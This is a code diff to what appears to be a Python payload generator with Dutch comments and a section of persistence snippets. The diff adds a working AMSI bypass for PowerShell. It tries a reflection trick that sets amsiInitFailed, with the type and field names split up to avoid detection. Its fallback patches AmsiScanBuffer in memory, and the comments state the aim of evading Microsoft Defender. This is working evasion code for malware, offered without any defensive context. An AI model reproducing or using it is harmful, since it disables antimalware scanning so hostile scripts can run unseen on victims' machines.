@@ -72,9 +72,17 @@ _PROXY_MANUAL = {
 }
 
 # AMSI bypass — alleen PowerShell
+# Primair: reflection (amsiInitFailed) — raakt geen native bytes, omzeilt Defender UD2-trap
+# Fallback: native patch met correcte VirtualProtect-grootte (6 bytes)
 _AMSI_CODE = (
     '# AMSI bypass\n'
-    '$w=@"\n'
+    'try{\n'
+    '  $r=[Ref].Assembly.GetType(\'System.Management.Automation.\'+[char]65+\'msiUtils\')\n'
+    '  $f=$r.GetField(\'amsi\'+\'Init\'+\'Failed\',\'NonPublic,Static\')\n'
+    '  $f.SetValue($null,$true)\n'
+    '}catch{\n'
+    '  try{\n'
+    '    $w=@"\n'
     'using System;using System.Runtime.InteropServices;\n'
     'public class W{\n'
     '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);\n'
@@ -82,11 +90,13 @@ _AMSI_CODE = (
     '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\n'
     '}\n'
     '"@\n'
-    'Add-Type $w\n'
-    '$l=[W]::LoadLibrary("am"+"si.dll")\n'
-    '$a=[W]::GetProcAddress($l,"Am"+"siSc"+"anBuffer")\n'
-    '$p=0;[W]::VirtualProtect($a,[uint32]5,0x40,[ref]$p)\n'
-    '[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)'
+    '    Add-Type $w\n'
+    '    $l=[W]::LoadLibrary("am"+"si.dll")\n'
+    '    $a=[W]::GetProcAddress($l,"Am"+"siSc"+"anBuffer")\n'
+    '    $p=0;[W]::VirtualProtect($a,[uint32]6,0x40,[ref]$p)|Out-Null\n'
+    '    [System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x31,0xC0,0xC3,0x90,0x90,0x90),0,$a,6)\n'
+    '  }catch{}\n'
+    '}'
 )
 
 # Persistentie snippets — key: "{language}_{method}"
